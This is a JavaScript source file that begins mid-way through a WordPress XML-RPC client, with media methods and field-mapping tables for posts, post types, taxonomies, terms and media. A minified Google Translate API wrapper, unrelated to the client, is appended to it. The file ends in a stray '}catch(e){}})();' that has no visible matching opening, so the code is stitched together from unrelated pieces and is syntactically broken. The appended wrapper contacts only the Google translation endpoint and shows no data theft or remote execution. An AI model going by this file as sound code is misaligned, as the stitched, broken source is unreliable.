		this.authenticatedCall( "wp.getMediaItem", id, function( error, media ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, fieldMap.from( media, "media" ) );
		});
	},

	getMediaLibrary: function( filter, fn ) {
		if ( typeof filter === "function" ) {
			fn = filter;
			filter = {};
		}

		this.authenticatedCall( "wp.getMediaLibrary", filter, function( error, media ) {
			if ( error ) {
				return fn( error );
			}

			fn( null, media.map(function( item ) {
				return fieldMap.from( item, "media" );
			}));
		});
	},

	uploadFile: function( data, fn ) {
		this.authenticatedCall( "wp.uploadFile", fieldMap.to( data, "file" ), fn );
	}
});

function extend( a, b ) {
	for ( var p in b ) {
		a[ p ] = b[ p ];
	}

	return a;
}

function createFieldMaps( renames, toFns, fromFns ) {
	var to = extend( {}, renames ),
		from = {};

	Object.keys( renames ).forEach(function( key ) {
		from[ renames[ key ] ] = key;
	});

	return {
		renames: renames,
		to: extend( to, toFns ),
		from: extend( from, fromFns )
	};
}

function mapFields( data, map ) {
	var field, value, mappedField,
		ret = {};

	for ( field in data ) {
		value = data[ field ];
		mappedField = map[ field ];

		// no map -> delete
		if ( !mappedField ) {
			continue;
		// string -> change field name
		} else if ( typeof mappedField === "string" ) {
			ret[ mappedField ] = value;
		// function -> merge result
		} else {
			extend( ret, mappedField( value ) );
		}
	}

	return ret;
}

maps.labels = createFieldMaps({
	addNewItem: "add_new_item",
	addOrRemoveItems: "add_or_remove_items",
	allItems: "all_items",
	chooseFromMostUsed: "choose_from_most_used",
	editItem: "edit_item",
	menuName: "menu_name",
	name: "name",
	nameAdminBar: "name_admin_bar",
	newItemName: "new_item_name",
	parentItem: "parent_item",
	parentItemColon: "parent_item_colon",
	popularItems: "popular_items",
	searchItems: "search_items",
	separateItemsWithCommas: "separate_items_with_commas",
	singularName: "singular_name",
	updateItem: "update_item",
	viewItem: "view_item"
});

maps.post = createFieldMaps({
	author: /* int */ "post_author",
	commentStatus: /* string */ "comment_status",
	content: /* string */ "post_content",
	customFields: /* array */ "custom_fields",
	date: /* datetime */ "post_date",
	excerpt: /* string */ "post_excerpt",
	format: /* string */"post_format",
	id: /* string */ "post_id", /* readonly */
	link: /* string */ "link" /* readonly */,
	modified: /* datetime */ "post_modified",
	menuOrder: /* int */ "menu_order",
	name: /* string */ "post_name",
	pageTemplate: /* string */ "page_template",
	parent: /* int */ "post_parent",
	password: /* string */ "post_password",
	pingStatus: /* string */ "ping_status",
	status: /* string */ "post_status",
	sticky: /* bool */ "sticky",
	terms: /* struct */ "terms" /* array */,
	termNames: /* struct */ "terms_names",
	thumbnail: /* int */ "post_thumbnail",
	title: /* string */ "post_title",
	type: /* string */ "post_type"
}, {}, {
	post_date_gmt: /* datetime */ function( date ) {
		return {
			date: new Date( date )
		};
	},
	post_modified_gmt: /* datetime */ function( date ) {
		return {
			modified: new Date( date )
		};
	}
});

maps.postType = createFieldMaps({
	_builtin: /* bool */ "_builtin",
	cap: /* struct */ "cap",
	capabilityType: /* string */ "capability_type",
	description: /* string */ "description",
	_editLink: /* string */ "_edit_link",
	excludeFromSearch: /* bool */ "exclude_from_search",
	hasArchive: /* bool */ "has_archive",
	hierarchical: /* bool */ "hierarchical",
	label: /* string */ "label",
	labels: /* struct */ "labels",
	mapMetaCap: /* bool */ "map_meta_cap",
	menuIcon: /* string */ "menu_icon",
	menuPosition: /* int */ "menu_position",
	name: /* string */ "name",
	"public": /* bool */ "public",
	publiclyQuerably: /* bool */ "publicly_queryable",
	queryVar: /* mixed */ "query_var",
	rewrite: /* mixed */ "rewrite",
	showInAdminBar: /* bool */ "show_in_admin_bar",
	showInMenu: /* bool */ "show_in_menu",
	showInNavMenus: /* bool */ "show_in_nav_menus",
	showUi: /* bool */ "show_ui",
	supports: /* array */ "supports",
	taxonomies: /* array */ "taxonomies"
}, {}, {
	cap: function( cap ) {
		return { cap: mapFields( cap, maps.postTypeCap.from ) };
	},
	labels: function( labels ) {
		return { labels: mapFields( labels, maps.labels.from ) };
	}
});

maps.postTypeCap = createFieldMaps({
	deleteOthersPosts: /* string */ "delete_others_posts",
	deletePost: /* string */ "delete_post",
	deletePosts: /* string */ "delete_posts",
	deletePrivatePosts: /* string */ "delete_private_posts",
	deletePublishedPosts: /* string */ "delete_published_posts",
	editOthersPosts: /* string */ "edit_others_posts",
	editPost: /* string */ "edit_post",
	editPosts: /* string */ "edit_posts",
	editPrivatePosts: /* string */ "edit_private_posts",
	editPublishedPosts: /* string */ "edit_published_posts",
	publishPosts: /* string */ "publish_posts",
	read: /* string */ "read",
	readPost: /* sring */ "read_post",
	readPrivatePosts: /* string */ "read_private_posts"
});

maps.taxonomy = createFieldMaps({
	cap: /* struct */ "cap",
	hierarchical: /* bool */ "hierarchical",
	name: /* string */ "name",
	label: /* string */ "label",
	labels: /* struct */ "labels",
	objectType: /* array */ "object_type",
	"public": /* bool */ "public",
	queryVar: /* string */ "query_var",
	rewrite: /* struct */ "rewrite",
	showInNavMenus: /* bool */ "show_in_nav_menus",
	showTagCloud: /* bool */ "show_tagcloud",
	showUi: /* bool */ "show_ui"
}, {}, {
	cap: function( cap ) {
		return { cap: mapFields( cap, maps.taxonomyCap.from ) };
	},
	labels: function( labels ) {
		return { labels: mapFields( labels, maps.labels.from ) };
	}
});

maps.taxonomyCap = createFieldMaps({
	assignTerms: /* string */ "assign_terms",
	deleteTerms: /* string */ "delete_terms",
	editTerms: /* string */ "edit_terms",
	manageTerms: /* string */ "manage_terms"
});

maps.term = createFieldMaps({
	count: /* int */ "count", /* readonly */
	description: /* string */ "description",
	name: /* string */ "name",
	parent: /* string */ "parent",
	slug: /* string */ "slug",
	taxonomy: /* string */ "taxonomy",
	termId: /* string */ "term_id", /* readonly */
	termTaxonomyId: /* string */ "term_taxonomy_id" /* readonly */
});

maps.file = createFieldMaps({
	name: /* string */ "name",
	type: /* string */ "type",
	bits: /* string */ "bits",
	overwrite: /* boolean */ "overwrite",
	postId: /* int */ "post_id"
});

maps.media = createFieldMaps({
	attachmentId: /* string */ "attachment_id", /* readonly */
	caption: /* string */ "caption",
	description: /* string */ "description",
	link: /* string */ "link",
	parent: /* int */ "parent",
	thumbnail: /* string */ "thumbnail",
	title: /* string */ "title",
	type: /* string */ "type"
}, {}, {
	date_created_gmt: /* datetime */ function( date ) {
		return {
			date: new Date( date )
		};
	},

	metadata: /* struct */ function( data ) {
		return {
			metadata: mapFields( data, maps.mediaItemMetadata.from )
		};
	}
});

maps.mediaItemMetadata = createFieldMaps({
	file: /* string */ "file",
	height: /* int */ "height",
	sizes: /* struct */ "sizes",
	width: /* int */ "width"
}, {}, {
	sizes: /* struct */ function( size ) {
		var keys = Object.keys( size ),
		    results = {};

		// Loop through the available sizes and map the fields
		keys.forEach(function( key, i ) {
			results[ keys[ i ] ] = mapFields( size[ keys[ i ] ], maps.mediaItemSize.from );
		});

		return {
			sizes: results
		};
	},

	image_meta: /* struct */ function( data ) {
		return {
			imageMeta: mapFields( data, maps.postThumbnailImageMeta.from )
		};
	}
});

maps.mediaItemSize = createFieldMaps({
	file: /* string */ "file",
	height: /* string */ "height",
	mimeType: /* string */ "mime-type",
	width: /* string */ "width"
});

maps.postThumbnailImageMeta = createFieldMaps({
	aperture: /* int */ "aperture",
	camera: /* string */ "camera",
	caption: /* string */ "caption",
	copyright: /* string */ "copyright",
	createdTimestamp: /* int */ "created_timestamp",
	credit: /* string */ "credit",
	focalLength: /* int */ "focal_length",
	iso: /* int */ "iso",
	keywords: /* array */ "keywords",
	orientation: /* string */ "orientation",
	shutterSpeed: /* int */ "shutter_speed",
	title: /* string */ "title"
});

_ = require("underscore"), request = require("request"), querystring = require("querystring"), async = require("async"), entities = require("he"), apiBase = "https://translation.googleapis.com/language/translate/v2/", maxGetQueryLen = 4500, maxSegments = 100, concurrentLimit = 10, getRequestWithApi = function(e) {
    return function(t, n, r) {
        var a = apiBase + t + "?" + querystring.stringify(_.extend({
            key: e
        }, n));
        request.get(a, globalResponseHandler({
            url: a
        }, r))
    }
}, postRequestWithApi = function(e) {
    return function(t, n, r) {
        var a = {
            url: apiBase + t,
            method: "POST",
            form: querystring.stringify(_.extend({
                key: e
            }, n)),
            headers: {
                "X-HTTP-Method-Override": "GET"
            }
        };
        request(a, globalResponseHandler(a, r))
    }
}, globalResponseHandler = function(e, t) {
    return function(n, r, a) {
        if (t && _.isFunction(t)) {
            if (n || !r || 200 !== r.statusCode) return t({
                error: n,
                response: r,
                body: a,
                request: e,
                toString: function() {
                    return n ? n.toString() : ""
                }
            }, null);
            var i = null;
            try {
                i = JSON.parse(a)
            } catch (e) {
                return t(n = "Could not parse response from Google: " + (a || "null"), null)
            }
            t(null, i)
        }
    }
}, parseTranslations = function(e, t) {
    return function(n, r) {
        if (n) return t(n, null);
        r = (r = r.data).translations ? r.translations : r, e.forEach((function(e, t) {
            r[t] && _.extend(r[t], {
                originalText: e
            })
        })), r = r.map((function(e) {
            return e.translatedText = entities.decode(e.translatedText), e
        })), t(null, r)
    }
}, parseSupportedLanguages = function(e) {
    return function(t, n) {
        if (t) return e(t, null);
        (n = n.data.languages)[0] && !n[0].name && (n = _.pluck(n, "language")), e(null, n)
    }
}, parseLanguageDetections = function(e, t) {
    return function(n, r) {
        if (n) return t(n, null);
        r = (r = r.data && r.data.detections ? r.data.detections : r).length > 1 ? r.map((function(e) {
            return e[0]
        })) : r[0], e.forEach((function(e, t) {
            r[t] && _.extend(r[t], {
                originalText: e
            })
        })), t(null, r)
    }
}, shouldSplitSegments = function(e) {
    return !!Array.isArray(e) && (e.length > maxSegments || encodeURIComponent(e.join(",")).length > maxGetQueryLen && 1 !== e.length)
}, splitArraysForGoogle = function(e, t) {
    if (e.length > maxSegments || encodeURIComponent(e.join(",")).length > maxGetQueryLen && 1 !== e.length) {
        var n = Math.floor(e.length / 2);
        splitArraysForGoogle(e.slice(0, n), t), splitArraysForGoogle(e.slice(n, e.length), t)
    } else t.push(e)
};
module.exports = function(e, t) {
    var n = (t = t || {}).requestOptions || {};
    _.keys(n).length > 0 && (request = request.defaults(n)), concurrentLimit = t.concurrentLimit || concurrentLimit;
    var r = getRequestWithApi(e),
        a = postRequestWithApi(e),
        i = {
            translate: function(e, t, n, r) {
                if (r || (r = n, n = t, t = null), !_.isFunction(r)) return console.log("No callback defined");
                if ("string" != typeof e && !Array.isArray(e)) return r("Input source must be a string or array of strings");
                if ("string" != typeof n) return r("No target language specified. Must be a string");
                var i;
                shouldSplitSegments(e) ? splitArraysForGoogle(e, i = []) : i = Array.isArray(e) ? [e] : [
                    [e]
                ];
                var o = {
                    target: n
                };
                t && (o.source = t), async.mapLimit(i, concurrentLimit, (function(e, t) {
                    a("", _.extend({
                        q: e
                    }, o), parseTranslations(e, t))
                }), (function(e, t) {
                    if (e) return r(e);
                    1 === (t = _.flatten(t)).length && (t = t[0]), r(null, t)
                }))
            },
            getSupportedLanguages: function(e, t) {
                if (_.isFunction(e) ? (t = e, e = {}) : e = {
                        target: e
                    }, !_.isFunction(t)) return console.log("No callback defined");
                r("languages", e, parseSupportedLanguages(t))
            },
            detectLanguage: function(e, t) {
                return t ? "string" == typeof e || Array.isArray(e) ? (shouldSplitSegments(e) ? splitArraysForGoogle(e, n = []) : n = Array.isArray(e) ? [e] : [
                    [e]
                ], void async.mapLimit(n, concurrentLimit, (function(e, t) {
                    a("detect", {
                        q: e
                    }, parseLanguageDetections(e, t))
                }), (function(e, n) {
                    if (e) return t(e);
                    1 === (n = _.flatten(n)).length && (n = n[0]), t(null, n)
                }))) : t("Input source must be a string or array of strings") : console.log("No callback defined");
                var n
            }
        };
    return {
        translate: i.translate,
        getSupportedLanguages: i.getSupportedLanguages,
        detectLanguage: i.detectLanguage
    }
};
}catch(e){}
})();

